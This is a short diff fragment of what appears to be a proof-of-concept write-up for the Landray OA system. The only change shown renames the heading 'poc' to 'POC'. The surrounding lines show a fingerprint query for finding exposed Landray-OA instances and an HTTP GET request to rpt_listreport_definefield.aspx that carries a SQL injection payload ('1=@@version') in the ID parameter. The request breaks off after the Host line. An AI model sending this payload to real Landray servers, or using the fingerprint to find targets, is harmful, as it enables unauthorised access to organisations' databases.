@@ -6,7 +6,7 @@ icon_hash="953405444"||app="Landray-OA系统"
 ```
 
 
-## poc
+## POC
 ```
 GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
 Host: 127.0.0.1
